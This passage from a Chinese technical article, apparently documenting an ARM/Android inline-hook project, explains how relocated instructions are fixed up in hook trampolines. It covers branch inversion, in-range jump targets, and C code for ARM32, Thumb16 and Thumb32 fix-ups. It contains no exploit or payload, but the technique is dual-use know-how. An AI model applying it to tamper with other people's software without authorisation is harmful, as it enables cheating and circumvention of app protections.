&lt;p&gt;12 Bytes的备份代码与各自对应的修复代码自上而下一一对应，尾部再添加个跳转回原程序的LDR。这就是上文中设想的最标准的修复方式。然而当其中混入了一条条件跳转指令后：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730150529.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;我们发现按照原程序的顺序和逻辑去修复条件跳转指令的话，会导致条件跳转指令对应的修复指令（图中红色部分）不是完整的一部分，而且第二部分需要出现在返回原程序跳转的后面才能保持原来的程序逻辑。这时有两个问题：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;图中X的值如何确定？我们是从上到下一条条修复备份指令然后拼接的，也就是说这条BLS指令下方的指令在修复它的时候还没被修复。这样这个X的值就无法确定？&lt;/li&gt;
&lt;li&gt;Thumb-2模式在备份时，12 Bytes最大是可能备份6条Thumb16指令的。也就是说，可能在备份指令中出现多条条件跳转指令，这时候会出现跳转嵌套，如下图：&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730150552.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;为了解决第一个问题，本人先在Hook一开始的init函数中建立一个记录所有备份指令修复后长度的数组&lt;code&gt;pstInlineHook-&amp;gt;backUpFixLengthList&lt;/code&gt;，然后当修复条件跳转指令时，通过计算其后面修复指令的长度来得到X的值。这个方法一开始只是用来解决问题1的，当时还没想到问题2的情况。因为这个数组中看不出后面的指令是否存在其它条件跳转指令，所以最后的跳转嵌套时会出错。那第二个问题如何解决呢？本人开始意识到如果条件跳转指令要用这种”两段“式的修复方式的话，会使得之后的修复逻辑变得很复杂。但是按照原程序的执行逻辑顺序似乎又只能这么做…吗？不，第一次优化方案如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730150619.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这个方案通过连续的三个跳转命令来缩小这个BXX结构，使其按照原来的逻辑跳转到符合条件的跳转指令去，然后再跳转一次。至此其实已经解决了当前遇到的“两段”式麻烦。但是最后本人又想到了一个新的优化方案：&lt;code&gt;逆向思维方案&lt;/code&gt;，可以简化跳转逻辑并在Arm32和Thumb32下减少一条跳转指令的空间（Thumb16下由于需要补NOP所以没有减小空间占用），如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730150645.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;图中可以看到，原来的BLS指令被转化为了BHI指令，也就是&lt;code&gt;小于等于&lt;/code&gt;的跳转逻辑变成了&lt;code&gt;大于&lt;/code&gt;。这样一来，原本跳转的目标逻辑现在就可以紧贴到BHI指令下面。从而使得条件跳转指令的修复代码也和其它指令一样，成为一个连续的代码段。并且BHI后面的参数在Thumb16中将固定为12。那么对于多条条件跳转指令来说呢？如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730150709.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从图中可以看出来，又回到了最初从上到下一一对应，末尾跳转的形式。而之前新增的&lt;code&gt;pstInlineHook-&amp;gt;backUpFixLengthList&lt;/code&gt;数组依然保留了，因为当跳转的目标地址依然在备份代码范围内时需要用到它，下一部分中将会介绍。&lt;/p&gt;

&lt;h4 id=&#34;跳转目标在备份代码中&#34;&gt;跳转目标在备份代码中&lt;/h4&gt;

&lt;p&gt;上文提到，如果我们备份代码中的跳转指令依然是跳到备份代码中呢？虽然我们的备份代码很短，但现实测试中的确遇到了这样的场景。出现了B 2的情况，可能是由于部分编译器把这个作为NOP指令吧。因此我们需要解决一下。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;判断跳转的目标地址是否在备份代码范围内。&lt;/li&gt;
&lt;li&gt;如果不在的话，一切照旧；在的话那就计算跳转目标在备份代码中的偏移OFFSET1。&lt;/li&gt;
&lt;li&gt;利用Hook初始化时候统计的&lt;code&gt;pstInlineHook-&amp;gt;backUpFixLengthList&lt;/code&gt;数组和偏移OFFSET1来推算出在修复指令中的新偏移OFFSET2。&lt;/li&gt;
&lt;li&gt;导入修复指令在内存中的地址ADDR1，然后用ADDR1+OFFSET2即可得到新的跳转地址Value。&lt;/li&gt;
&lt;li&gt;根据Arm/Thumb模式来选择是否对Value+1。&lt;/li&gt;
&lt;li&gt;用新的Value代替原本计算得到的绝对跳转地址。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这个处理过程的一个关键点在于虽然我们还没有修复条件跳转指令之后的备份指令，但是它们修复后的长度是可以预测的，每种指令各自的修复指令长度是固定的。因此可以在在修复下方指令前预测出跳转偏移长度。&lt;/p&gt;

&lt;h2 id=&#34;arm32&#34;&gt;ARM32&lt;/h2&gt;

&lt;h4 id=&#34;blx-bl-b-bx&#34;&gt;BLX, BL, B, BX&lt;/h4&gt;

&lt;p&gt;修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    if (type == BLX_ARM || type == BL_ARM || type == B_ARM || type == BX_ARM) {
        uint32_t x;
        int top_bit;
        uint32_t imm32;
        uint32_t value;

        if (type == BLX_ARM || type == BL_ARM) {
            // ADD LR, PC, #4 
            trampoline_instructions[trampoline_pos++] = 0xE28FE004; 
        }
        // LDR PC, [PC, #-4] 
        trampoline_instructions[trampoline_pos++] = 0xE51FF004;     
        if (type == BLX_ARM) {
            //BLX_ARM 
            x = ((instruction &amp;amp; 0xFFFFFF) &amp;lt;&amp;lt; 2) | ((instruction &amp;amp; 0x1000000) &amp;gt;&amp;gt; 23); 
        }
        else if (type == BL_ARM || type == B_ARM) {
            //BL_ARM B_ARM 
            x = (instruction &amp;amp; 0xFFFFFF) &amp;lt;&amp;lt; 2;                                       
        }
        else {
            //BX_ARM            
            x = 0;                                                                   
        }
        
        top_bit = x &amp;gt;&amp;gt; 25;
        imm32 = top_bit ? (x | (0xFFFFFFFF &amp;lt;&amp;lt; 26)) : x;
        if (type == BLX_ARM) {
            value = pc + imm32 + 1;
        }
        else {
            value = pc + imm32;
        }
        trampoline_instructions[trampoline_pos++] = value;
        
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;假设原程序实际要跳转到的地址为&lt;code&gt;addr1&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;由于BLX,BL指令会在跳转前将下一条指令地址保存到LR寄存器中，因此先用&lt;code&gt;ADD LR, PC, #4&lt;/code&gt;把LR寄存器的值保存下来，这个值是本条指令地址+12 bytes处，即存储&lt;code&gt;addr1&lt;/code&gt;数据的下一个地址。&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;LDR PC, [PC, #-4]&lt;/code&gt;将PC指向原本要跳转过去的地址&lt;code&gt;addr1&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;addr1&lt;/code&gt;的具体值保存在接下来的4 bytes中。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这个&lt;code&gt;addr1&lt;/code&gt;的具体值是计算出来的，由于B系列指令使用的是相对地址，因此，需要加上PC的值。&lt;/p&gt;

&lt;p&gt;代码中的x的值就是偏移值，它处于指令的后3 bytes，用&lt;code&gt;instruction &amp;amp; 0xFFFFFF&lt;/code&gt;即可得到。当它为0时，代表当前PC所指向的地址（ARM32下为本条命令+8 bytes）。每当它增加或减少1，就代表地址增加或减少4 bytes，因此代码中使用&lt;code&gt;&amp;lt;&amp;lt;2&lt;/code&gt;对x的值进行*4。&lt;/p&gt;

&lt;p&gt;所以这个x也可能是个负数，因此通过取top_bit来判断当前这个偏移的正负，用imm32代表综合考虑了x、正负、thumb标志的偏移值。&lt;/p&gt;

&lt;p&gt;BLX指令需要额外关心跳转后thumb-2模式下的地址，由于thumb模式下地址的最小单位是2 bytes，而不是ARM32下的4 bytes，因此需要通过&lt;code&gt;instruction &amp;amp; 0x1000000&lt;/code&gt;获得指令第25 bit的标志位，如果标志位为1，地址就需要+2 bytes。&lt;/p&gt;

&lt;p&gt;最后，将pc加上imm32就是所需跳转的地址的绝对地址&lt;code&gt;addr1&lt;/code&gt;。由于BLX需要切换thumb模式，因此我们用&lt;code&gt;LDR PC, [PC, #-4]&lt;/code&gt;来跳转的时候需要&lt;code&gt;addr1&lt;/code&gt;额外再+1来切换CPU模式。&lt;/p&gt;

&lt;h4 id=&#34;add&#34;&gt;ADD&lt;/h4&gt;

&lt;p&gt;修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    else if (type == ADD_ARM) {
        int rd;
        int rm;
        int r;
        
        rd = (instruction &amp;amp; 0xF000) &amp;gt;&amp;gt; 12;
        rm = instruction &amp;amp; 0xF;
        
        for (r = 12; ; --r) { //找一个既不是rm,也不是rd的寄存器 
            if (r != rd &amp;amp;&amp;amp; r != rm) {
                break;
            }
        }
        
        trampoline_instructions[trampoline_pos++] = 0xE52D0004 | (r &amp;lt;&amp;lt; 12); // PUSH {Rr} 
        trampoline_instructions[trampoline_pos++] = 0xE59F0008 | (r &amp;lt;&amp;lt; 12); // LDR Rr, [PC, #8] 
        trampoline_instructions[trampoline_pos++] = (instruction &amp;amp; 0xFFF0FFFF) | (r &amp;lt;&amp;lt; 16);
        trampoline_instructions[trampoline_pos++] = 0xE49D0004 | (r &amp;lt;&amp;lt; 12); // POP {Rr} 
        trampoline_instructions[trampoline_pos++] = 0xE28FF000; // ADD PC, PC, #0 
        trampoline_instructions[trampoline_pos++] = pc;
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ADD指令可能会涉及到PC，PC就是R15寄存器，用到它的时候它会位于该指令的[16:19]bit上，所以要找个别的寄存器存着原来程序PC的值代替这里的R15即可。&lt;/p&gt;

&lt;p&gt;本指令会用到位于指令[12:15]和[0:3]bit上的两个寄存器rd和rm，这两个在修复过程中要避免改变。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;从前12个寄存器中找一个既不是rd也不是rm的寄存器Rr就行，把它pop到栈上保存当前的值。&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;LDR Rr, [PC, #8]&lt;/code&gt;把修复代码尾部保存的PC的值赋给Rr。&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;(instruction &amp;amp; 0xFFF0FFFF) | (r &amp;lt;&amp;lt; 16);&lt;/code&gt;把Rr代替掉原来[16:19]bit上的PC，这样这条ADD执行后就是原本程序中的结果。&lt;/li&gt;
&lt;li&gt;Rr的作用已经用完了，那就把它保存在栈上原来的值pop出来恢复它。&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;ADD PC, PC, #0&lt;/code&gt;来跳过下面尾部的pc数据，去继续执行pc值下方的代码。&lt;/li&gt;
&lt;li&gt;用4 bytes保存了原本程序中的pc值。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;adr-ldr-mov&#34;&gt;ADR, LDR, MOV&lt;/h4&gt;

&lt;p&gt;修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    else if (type == ADR1_ARM || type == ADR2_ARM || type == LDR_ARM || type == MOV_ARM) {
        int r;
        uint32_t value;
        
        r = (instruction &amp;amp; 0xF000) &amp;gt;&amp;gt; 12;
        
        if (type == ADR1_ARM || type == ADR2_ARM || type == LDR_ARM) {
            uint32_t imm32;
            
            imm32 = instruction &amp;amp; 0xFFF;
            if (type == ADR1_ARM) {
                value = pc + imm32;
            }
            else if (type == ADR2_ARM) {
                value = pc - imm32;
            }
            else if (type == LDR_ARM) {
                int is_add;
                
                is_add = (instruction &amp;amp; 0x800000) &amp;gt;&amp;gt; 23;
                if (is_add) {
                    value = ((uint32_t *) (pc + imm32))[0];
                }
                else {
                    value = ((uint32_t *) (pc - imm32))[0];
                }
            }
        }
        else {
            value = pc;
        }
            
        trampoline_instructions[trampoline_pos++] = 0xE51F0000 | (r &amp;lt;&amp;lt; 12); // LDR Rr, [PC] 
        trampoline_instructions[trampoline_pos++] = 0xE28FF000; // ADD PC, PC 
        trampoline_instructions[trampoline_pos++] = value;
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;用&lt;code&gt;(instruction &amp;amp; 0xF000) &amp;gt;&amp;gt; 12&lt;/code&gt;来获取命令中需要用到的寄存器Rr。&lt;/li&gt;
&lt;li&gt;由于这三个指令用的也是相对地址，所以用imm32获取指令[11:0]bit的值后，直接和pc进行加减。由于ADD和LDR涉及偏移的正负性，所以额外寻找各自的标志位来确认是用原pc值加还是减。&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;LDR Rr, [PC]&lt;/code&gt;将上一步计算得到的value的值赋给Rr。&lt;/li&gt;
&lt;li&gt;用&lt;code&gt;ADD PC, PC, #0&lt;/code&gt;命令来跳过下方存储的value数据，从value后面的指令开始继续执行。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;其它指令&#34;&gt;其它指令&lt;/h4&gt;

&lt;p&gt;ARM32下的其它指令无需修复，直接在备份代码中使用即可。&lt;/p&gt;

&lt;h2 id=&#34;thumb16&#34;&gt;Thumb16&lt;/h2&gt;

&lt;h4 id=&#34;b-bx&#34;&gt;B, BX&lt;/h4&gt;

&lt;p&gt;核心修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    trampoline_instructions[idx++] = 0xF8DF;
    trampoline_instructions[idx++] = 0xF000;    // LDR.W PC, [PC] 
    trampoline_instructions[idx++] = value &amp;amp; 0xFFFF;
    trampoline_instructions[idx++] = value &amp;gt;&amp;gt; 16;
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;计算出要跳转的绝对地址Value&lt;/li&gt;
&lt;li&gt;用LDR.W这个Thumb32指令加载后面的Value跳转过去&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;add-1&#34;&gt;ADD&lt;/h4&gt;

&lt;p&gt;核心修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    rdn = ((instruction &amp;amp; 0x80) &amp;gt;&amp;gt; 4) | (instruction &amp;amp; 0x7);
    
    for (r = 7; ; --r) {
        if (r != rdn) {
            break;
        }
    }
    
    trampoline_instructions[0] = 0xB400 | (1 &amp;lt;&amp;lt; r); // PUSH {Rr} 
    trampoline_instructions[1] = 0x4802 | (r &amp;lt;&amp;lt; 8); // LDR Rr, [PC, #8] 
    trampoline_instructions[2] = (instruction &amp;amp; 0xFF87) | (r &amp;lt;&amp;lt; 3); //我猜是adr Rd, Rr 
    trampoline_instructions[3] = 0xBC00 | (1 &amp;lt;&amp;lt; r); // POP {Rr} 
    trampoline_instructions[4] = 0xE002;    // B PC 
    trampoline_instructions[5] = 0xBF00;
    trampoline_instructions[6] = pc &amp;amp; 0xFFFF;  //计算得到的Value实际值 
    trampoline_instructions[7] = pc &amp;gt;&amp;gt; 16;
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;ADD_THUMB16命令会用到R0-R7中的某个寄存器Rn作为保存结果的寄存器，于是这个寄存器我们修复时不去影响它，从R0-R7中选择另一个Rr。先用PUSH将Rr原本的值存入栈中。&lt;/li&gt;
&lt;li&gt;把计算出来的与原PC相关的Value值存入Rr寄存器。&lt;/li&gt;
&lt;li&gt;把Rr代替原来指令ADD Rd, X中的X，从而加给目标寄存器Rd。&lt;/li&gt;
&lt;li&gt;POP出Rr原本的值&lt;/li&gt;
&lt;li&gt;用B命令进行跳转，从而跨越下方Value的值继续执行。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;mov-adr-ldr&#34;&gt;MOV, ADR, LDR&lt;/h4&gt;

&lt;p&gt;核心修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    trampoline_instructions[0] = 0x4800 | (r &amp;lt;&amp;lt; 8); // LDR Rd, [PC] 
    trampoline_instructions[1] = 0xE001;    // B PC, #2 
    trampoline_instructions[2] = value &amp;amp; 0xFFFF;
    trampoline_instructions[3] = value &amp;gt;&amp;gt; 16;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这三条都是把PC相关的值存入一个寄存器中。因此步骤很明确：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;用LDR命令把下方隔着2 Bytes的存着实际原本PC相关的值Value存入目标寄存器Rd中即可。&lt;/li&gt;
&lt;li&gt;用B命令跳6 Bytes到Value下方继续执行接下去的命令。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;cbz-cbnz&#34;&gt;CBZ, CBNZ&lt;/h4&gt;

&lt;p&gt;核心修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    trampoline_instructions[0] = instruction &amp;amp; 0xFD07;
    trampoline_instructions[1] = 0xE003;    // B PC, #6 
    trampoline_instructions[2] = 0xF8DF;
    trampoline_instructions[3] = 0xF000;    // LDR.W PC, [PC] 
    trampoline_instructions[4] = value &amp;amp; 0xFFFF;
    trampoline_instructions[5] = value &amp;gt;&amp;gt; 16;
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;将原本CBZ/CBNZ的参数清空，清空后参数为4（即PC+4）。例如：&lt;code&gt;CBNZ R0, 10&lt;/code&gt;变成&lt;code&gt;CBNZ R0, 4&lt;/code&gt;,满足条件时会向下跳4 Bytes；不满足条件时会继续执行下一条指令。&lt;/li&gt;
&lt;li&gt;如果不满足CB的条件，则继续执行&lt;code&gt;B PC, #6命令&lt;/code&gt;，跨过下面8 Bytes，去执行第10 Byte的指令，即下一条备份指令的修复指令中去。&lt;/li&gt;
&lt;li&gt;如果满足条件，会去执行&lt;code&gt;LDR.W PC, [PC]&lt;/code&gt;指令，从而根据计算出的Value跳转到原本CB需要跳转去的地方。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;其它指令-1&#34;&gt;其它指令&lt;/h4&gt;

&lt;p&gt;Thumb模式下，需要把其它备份的Thumb16指令下方补一个NOP！为什么？因为上文中我们修复的Thumb指令中都是用Thumb32指令LDR.W PC XXX进行跳转的。而&lt;code&gt;Thumb32下涉及修改PC的指令一定要位于可以整除4的地址上&lt;/code&gt;。因此，我们需要保证每个Thumb指令都被修复成可以整除4的大小，这样以后修复时只要保证当前LDR.W要在当前正在修复的指令中的偏移可以整除4就行了。&lt;/p&gt;

&lt;h2 id=&#34;thumb32&#34;&gt;Thumb32&lt;/h2&gt;

&lt;h4 id=&#34;b-bx-blx-bl&#34;&gt;B, BX, BLX, BL&lt;/h4&gt;

&lt;p&gt;修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    else if (type == BLX_THUMB32 || type == BL_THUMB32 || type == B1_THUMB32 || type == B2_THUMB32) {

        j1 = (low_instruction &amp;amp; 0x2000) &amp;gt;&amp;gt; 13;
        j2 = (low_instruction &amp;amp; 0x800) &amp;gt;&amp;gt; 11;
        s = (high_instruction &amp;amp; 0x400) &amp;gt;&amp;gt; 10;
        i1 = !(j1 ^ s);
        i2 = !(j2 ^ s);

        if (type == BLX_THUMB32 || type == BL_THUMB32) {
            LOGI(&amp;quot;BLX_THUMB32 BL_THUMB32&amp;quot;);
            trampoline_instructions[idx++] = 0xF20F;
            trampoline_instructions[idx++] = 0x0E09;    // ADD.W LR, PC, #9 
        }
        else if (type == B1_THUMB32) {
            LOGI(&amp;quot;B1_THUMB32&amp;quot;);
            trampoline_instructions[idx++] = 0xD000 | ((high_instruction &amp;amp; 0x3C0) &amp;lt;&amp;lt; 2);
            trampoline_instructions[idx++] = 0xE003;    // B PC, #6 
        }
        trampoline_instructions[idx++] = 0xF8DF;
        trampoline_instructions[idx++] = 0xF000;    // LDR.W PC, [PC] 
        if (type == BLX_THUMB32) {
            LOGI(&amp;quot;BLX_THUMB32&amp;quot;);
            x = (s &amp;lt;&amp;lt; 24) | (i1 &amp;lt;&amp;lt; 23) | (i2 &amp;lt;&amp;lt; 22) | ((high_instruction &amp;amp; 0x3FF) &amp;lt;&amp;lt; 12) | ((low_instruction &amp;amp; 0x7FE) &amp;lt;&amp;lt; 1);
            imm32 = s ? (x | (0xFFFFFFFF &amp;lt;&amp;lt; 25)) : x;
            value = pc + imm32;
            LOGI(&amp;quot;blx_thumb32 : value : %x&amp;quot;,value);
        }
        else if (type == BL_THUMB32) {
            LOGI(&amp;quot;BL_THUMB32&amp;quot;);
            x = (s &amp;lt;&amp;lt; 24) | (i1 &amp;lt;&amp;lt; 23) | (i2 &amp;lt;&amp;lt; 22) | ((high_instruction &amp;amp; 0x3FF) &amp;lt;&amp;lt; 12) | ((low_instruction &amp;amp; 0x7FF) &amp;lt;&amp;lt; 1);
            imm32 = s ? (x | (0xFFFFFFFF &amp;lt;&amp;lt; 25)) : x;
            value = pc + imm32 + 1;
        }
        else if (type == B1_THUMB32) {
            LOGI(&amp;quot;B1_THUMB32&amp;quot;);
            x = (s &amp;lt;&amp;lt; 20) | (j2 &amp;lt;&amp;lt; 19) | (j1 &amp;lt;&amp;lt; 18) | ((high_instruction &amp;amp; 0x3F) &amp;lt;&amp;lt; 12) | ((low_instruction &amp;amp; 0x7FF) &amp;lt;&amp;lt; 1);
            imm32 = s ? (x | (0xFFFFFFFF &amp;lt;&amp;lt; 21)) : x;
            value = pc + imm32 + 1;
        }
        else if (type == B2_THUMB32) {
            LOGI(&amp;quot;B2_THUMB32&amp;quot;);
            x = (s &amp;lt;&amp;lt; 24) | (i1 &amp;lt;&amp;lt; 23) | (i2 &amp;lt;&amp;lt; 22) | ((high_instruction &amp;amp; 0x3FF) &amp;lt;&amp;lt; 12) | ((low_instruction &amp;amp; 0x7FF) &amp;lt;&amp;lt; 1);
            imm32 = s ? (x | (0xFFFFFFFF &amp;lt;&amp;lt; 25)) : x;
            value = pc + imm32 + 1;
        }
        trampoline_instructions[idx++] = value &amp;amp; 0xFFFF;
        trampoline_instructions[idx++] = value &amp;gt;&amp;gt; 16;
        offset = idx;
    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段代码比较长哈，我整理了一下(每行代表2 Bytes)：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ADD.W LR, PC, #9（仅BL,BLX）.1
ADD.W LR, PC, #9（仅BL,BLX）.2 或 B PC, #2（仅B1）
LDR.W PC, [PC].1
LDR.W PC, [PC].2
Value.1
Value.2
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;由于这一类指令都是跳转指令，因此，当然会出现最后四行本项目中大家已经非常熟悉的套路：用LDR.W来加载绝对地址数据进行跳转。我们的插桩也都是这么做的。&lt;/li&gt;
&lt;li&gt;如果是BL,BLX指令的话，它俩是要保存返回地址的。于是就用ADD.W对LR寄存器进行操控。那么存进LR的返回地址是什么呢？是PC+9。也就是当前这条ADD.W指令所在地址+4（三级流水的PC领先当前thumb指令4 Bytes）然后+8（下方Value后的距离）的位置。而由于这里是Thumb模式，因此跳转目标执行完毕后需要对地址+1才能以Thumb模式跳转回来。因此是PC+9。&lt;/li&gt;
&lt;li&gt;如果是B1的话，那就直接用B加载6个偏移之后，也就是PC+2的Value即可。&lt;/li&gt;
&lt;li&gt;最后的Value是它们各自通过相对地址计算出的实际地址，部分为了Thumb模式还最后+1。感兴趣的朋友可以自己细看一下每条指令Value值的具体计算细节。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;tbb-tbh&#34;&gt;TBB, TBH&lt;/h4&gt;

&lt;p&gt;修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    trampoline_instructions[0] = 0xB400 | (1 &amp;lt;&amp;lt; rx);    // PUSH {Rx} 
    trampoline_instructions[1] = 0x4805 | (r &amp;lt;&amp;lt; 8); // LDR Rr, [PC, #20] 
    trampoline_instructions[2] = 0x4600 | (rm &amp;lt;&amp;lt; 3) | rx;   // MOV Rx, Rm 
    if (type == TBB_THUMB32) {
        LOGI(&amp;quot;TBB_THUMB32&amp;quot;);
        trampoline_instructions[3] = 0xEB00 | r;
        trampoline_instructions[4] = 0x0000 | (rx &amp;lt;&amp;lt; 8) | rx;   // ADD.W Rx, Rr, Rx 
        trampoline_instructions[5] = 0x7800 | (rx &amp;lt;&amp;lt; 3) | rx;   // LDRB Rx, [Rx] 
    }
    else if (type == TBH_THUMB32) {
         LOGI(&amp;quot;TBH_THUMB32&amp;quot;);
        trampoline_instructions[3] = 0xEB00 | r;
        trampoline_instructions[4] = 0x0040 | (rx &amp;lt;&amp;lt; 8) | rx;   // ADD.W Rx, Rr, Rx, LSL #1 
        trampoline_instructions[5] = 0x8800 | (rx &amp;lt;&amp;lt; 3) | rx;   // LDRH Rx, [Rx] 
    }
    trampoline_instructions[6] = 0xEB00 | r;
    trampoline_instructions[7] = 0x0040 | (r &amp;lt;&amp;lt; 8) | rx;    // ADD Rr, Rr, Rx, LSL #1 
    trampoline_instructions[8] = 0x3001 | (r &amp;lt;&amp;lt; 8); // ADD Rr, #1 
    trampoline_instructions[9] = 0xBC00 | (1 &amp;lt;&amp;lt; rx);    // POP {Rx} 
    trampoline_instructions[10] = 0x4700 | (r &amp;lt;&amp;lt; 3);    // BX Rr 
    trampoline_instructions[11] = 0xBF00;
    trampoline_instructions[12] = pc &amp;amp; 0xFFFF;
    trampoline_instructions[13] = pc &amp;gt;&amp;gt; 16;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这两条指令是查表跳转指令，类似于switch逻辑。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;R0-R7中取一个Rx寄存器，它不能是原本命令中已经用到的Rm,Rr寄存器，把它的值PUSH到栈上保存起来。&lt;/li&gt;
&lt;li&gt;TBB下，表中偏移计算为：offset=Rm+[原本的PC+4];TBH下则为：offset=2*Rm+[原本的PC+4]。&lt;/li&gt;
&lt;li&gt;根据计算出的偏移和原本的PC去取值放入Rr中。&lt;/li&gt;
&lt;li&gt;把Rx的值从栈中POP出来。&lt;/li&gt;
&lt;li&gt;由于是Thumb模式，于是对Rr+1后再用BX进行跳转。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;adr-ldr&#34;&gt;ADR, LDR&lt;/h4&gt;

&lt;p&gt;核心修复代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    trampoline_instructions[0] = 0x4800 | (r &amp;lt;&amp;lt; 8); // LDR Rd, [PC] 
    trampoline_instructions[1] = 0xE001;    // B PC, #2 
    trampoline_instructions[2] = value &amp;amp; 0xFFFF;
    trampoline_instructions[3] = value &amp;gt;&amp;gt; 16;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这三条都是把PC相关的值存入一个寄存器中。因此步骤很明确：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;用LDR命令把下方隔着2 Bytes的存着实际原本PC相关的值Value存入目标寄存器Rd中即可。&lt;/li&gt;
&lt;li&gt;用B命令跳6 Bytes到Value下方继续执行接下去的命令。&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;其它指令-2&#34;&gt;其它指令&lt;/h4&gt;

&lt;p&gt;Thumb32下的其它指令无需修复，直接在备份代码中使用即可。&lt;/p&gt;

&lt;h2 id=&#34;局限性思考&#34;&gt;局限性思考&lt;/h2&gt;

&lt;p&gt;本项目虽然尽可能多地考虑了各种指令与情况的修复方案，但是依然如下情况下可能对使用者造成问题。但是本人认为这些问题都是可以通过正确的使用方法来规避的。因此这部分可能更像是个使用指导。以下内容可能比较钻牛角尖，考虑的都是一些脑补的极端情况：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;备份之外的程序其它指令需要跳转到备份指令范围内&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Hook在函数最最最末尾&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;局限分析1&#34;&gt;局限分析1&lt;/h4&gt;

&lt;p&gt;这个情况理论上存在但&lt;code&gt;非常少见&lt;/code&gt;且&lt;code&gt;可以避免&lt;/code&gt;。因为备份指令的范围其实非常小，Arm下只有2条指令8 Bytes的大小，Thumb-2下也只有10/12 Bytes，对于有成千上万条指令的原程序来说概率非常小！并且这些备份的空间不是都会出问题。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;概率小&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;对于Arm来说&lt;/code&gt;：第一个4 Bytes上覆盖的是LDR跳转指令，第二个4 Bytes是地址，因此跳转到第一个LDR指令上是完全没有问题的，就按照Hook流程运行而已，只有正好跳转到第二个地址处才会出现将数据误以为是指令的错误。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;对于Thumb-2来说&lt;/code&gt;：跳转到Hook地址开头可能的Nop或LDR指令也是完全没有问题的，并且12/10Bytes下跳转到最后的4/2 Bytes中也是没有问题的，因为那里并没有被覆盖指令。依然仅仅是直接跳转到那个4 Bytes的地址才出问题。当然Thumb-2模式下可能出现最后的2 Bytes是被截断的Thumb32位的后16位的可能性（它的前16位被跳转地址的后16位覆盖了）。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;可以避免&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在使用Hook工具前肯定是会逆向分析的。要避免这种情况最简单的方法就是不要让自己的备份代码“跨代码块”。什么意思？看下图即可理解：&lt;/p&gt;

&lt;p&gt;（贴一张有loc小标签的图，别太密集，有一个就行，否则读者会觉得这样的情景很多）&lt;/p&gt;

